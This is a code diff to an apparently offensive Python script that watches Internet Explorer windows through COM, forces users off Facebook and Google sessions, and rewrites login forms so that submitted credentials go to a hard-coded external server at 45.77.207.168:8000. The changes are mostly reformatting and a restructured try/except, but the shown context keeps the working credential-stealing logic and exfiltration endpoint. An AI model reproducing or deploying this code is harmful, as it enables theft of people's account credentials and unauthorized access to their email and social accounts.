@@ -6,21 +6,23 @@ import urllib
 data_receiver = "http://45.77.207.168:8000/"
 
 target_sites  = {}
-target_sites["www.facebook.com"] = \
-    {"logout_url"      : None,
-     "logout_form"     : "logout_form",
-     "login_form_index": 0,
-     "owned"           : False}
+target_sites["www.facebook.com"] = {
+                                    "logout_url"      : None,
+                                     "logout_form"     : "logout_form",
+                                     "login_form_index": 0,
+                                     "owned"           : False
+                                    }
 
-target_sites["accounts.google.com"]    = \
-    {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
-     "logout_form"      : None,
-     "login_form_index" : 0,
-     "owned"            : False}
+target_sites["accounts.google.com"] = {
+                                        "logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
+                                         "logout_form"      : None,
+                                         "login_form_index" : 0,
+                                         "owned"            : False
+                                      }
 
-target_sites["www.gmail.com"]   = target_sites["accounts.google.com"] 
-target_sites["mail.google.com"] = target_sites["accounts.google.com"]
-target_sites["myaccount.google.com"] = target_sites["accounts.google.com"]
+target_sites["www.gmail.com"]           = target_sites["accounts.google.com"] 
+target_sites["mail.google.com"]         = target_sites["accounts.google.com"]
+target_sites["myaccount.google.com"]    = target_sites["accounts.google.com"]
 
 Clsid='{0E1487F2-9865-4CD5-B99A-9C5EB063A2BC}'
 
@@ -33,8 +35,8 @@ def wait_for_browser(browser):
 
 def main(*args, **kwargs):
     while True:
-        try:
-            for browser in windows:
+        for browser in windows:
+            try:
                 url = urlparse.urlparse(browser.LocationUrl)
                 if url.hostname in target_sites:
                     if target_sites[url.hostname]["owned"]:
@@ -57,9 +59,10 @@ def main(*args, **kwargs):
                         browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                         target_sites[url.hostname]["owned"] = True
                     except: pass
-            time.sleep(5)
-        except KeyboardInterrupt:
-            break
+            
+            except KeyboardInterrupt:
+                break
+        time.sleep(5)
 
 if __name__ == '__main__':
     main()
